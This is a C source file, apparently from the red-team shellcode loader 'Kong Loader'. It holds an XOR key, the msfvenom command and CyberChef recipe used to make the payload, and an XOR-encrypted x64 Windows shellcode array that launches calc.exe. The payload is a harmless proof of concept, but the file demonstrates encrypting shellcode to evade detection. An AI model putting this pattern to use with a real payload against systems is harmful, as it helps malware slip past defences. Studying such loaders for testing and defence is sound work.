/**
 * Mozilla Public License (MPL) Version 2.0.
 * 
 * Copyright (c) 2024 Tijme Gommers (@tijme).
 * 
 * This source code file is part of Kong Loader. Kong Loader is 
 * licensed under Mozilla Public License (MPL) Version 2.0, and 
 * you are free to use, modify, and distribute this file under 
 * its terms. However, any modified versions of this file must 
 * include this same license and copyright notice.
 */

/**
 * Predefined definitions
 */
#define STATIC_SHELLCODE_NAME "Msfvenom-WinExec-1" // Name to be printed
#define STATIC_SHELLCODE_IS_ALREADY_ENCRYPTED 0x1 // May only be negative for debugging purposes with plain static shellcode
#define STATIC_SHELLCODE_HAS_RETURN_VALUE 0x0 // Print return value of the shellcode to the console

/**
 * The XOR password to use.
 */
static uint8_t StaticPassword[] = { 0xAA, 0x41, 0xCC };

/**
 * The shellcode to use.
 * 
 * This was generated using MSFVENOM and formatted with CyberChef.
 * msfvenom --platform windows -i 0 -e generic/none --arch x64 -f c -p windows/x64/exec CMD=calc.exe EXITFUNC=none
 * https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'%20'%7D,'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'%5C%5Cn'%7D,'',true,false,true,false)From_Hex('0x%20with%20comma')XOR(%7B'option':'Hex','string':'AA41CC'%7D,'Standard',false)To_Hex('0x%20with%20comma',12)
 */
static uint8_t StaticShellcode[] = {
    0x56,0x09,0x4f,0x4e,0xb1,0x24,0x6a,0x41,0xcc,0xaa,0x00,0x9d,
    0xeb,0x11,0x9e,0xfb,0x17,0x84,0x9b,0x93,0xa9,0xe2,0xca,0x9e,
    0xca,0x09,0x47,0xf8,0x59,0x84,0x21,0x13,0xec,0xe2,0xca,0xbe,
    0xfa,0x09,0xc3,0x1d,0x0b,0x86,0xe7,0x70,0x05,0xe2,0x70,0x0c,
    0x06,0x7d,0xad,0xd6,0x43,0xe0,0x8a,0x00,0x0d,0x63,0x4c,0x8d,
    0xab,0x80,0x2e,0x47,0x13,0x8d,0xfb,0x09,0x47,0xf8,0x61,0x47,
    0xe8,0x7d,0x84,0xab,0x91,0x47,0x2a,0xc9,0xcc,0xaa,0x41,0x84,
    0x2f,0x81,0xb8,0xcd,0x09,0xcd,0x7a,0x11,0x47,0xe2,0x59,0x88,
    0x21,0x01,0xec,0xe3,0x40,0x1c,0x49,0x17,0x84,0x55,0x88,0x8d,
    0x21,0x75,0x44,0xe2,0x40,0x1a,0xe7,0x70,0x05,0xe2,0x70,0x0c,
    0x06,0x00,0x0d,0x63,0x4c,0x8d,0xab,0x80,0xf4,0x4a,0x34,0x3d,
    0xe6,0x42,0x80,0x8e,0x49,0x89,0x93,0x90,0xb9,0x72,0x19,0x88,
    0x21,0x01,0xe8,0xe3,0x40,0x1c,0xcc,0x00,0x47,0xa6,0x09,0x88,
    0x21,0x01,0xd0,0xe3,0x40,0x1c,0xeb,0xca,0xc8,0x22,0x09,0xcd,
    0x7a,0x00,0x94,0xeb,0x19,0x92,0xf3,0x1b,0x8d,0xf2,0x00,0x95,
    0xeb,0x1b,0x84,0x29,0xad,0xec,0xeb,0x13,0x33,0x4a,0x19,0x8d,
    0xf3,0x1b,0x84,0x21,0x53,0x25,0xfd,0xbe,0x33,0x55,0x1c,0x84,
    0x10,0x40,0xcc,0xaa,0x41,0xcc,0xaa,0x41,0xcc,0xe2,0xcc,0x41,
    0xab,0x40,0xcc,0xaa,0x00,0x76,0x9b,0xca,0xa3,0x2d,0xbe,0x19,
    0x11,0xeb,0x09,0x48,0x1c,0x8d,0x10,0xe7,0x59,0x17,0xdc,0x33,
    0x7f,0x09,0x4f,0x6e,0x69,0xf0,0xac,0x3d,0xc6,0x2a,0xba,0x2c,
    0xdf,0x44,0x77,0xed,0x52,0xbe,0xc5,0x2b,0xcc,0xf3,0x00,0x45,
    0x70,0xbe,0x19,0xc9,0x20,0xa0,0xc9,0x6f,0xa9,0xd2,0x24,0xcc
};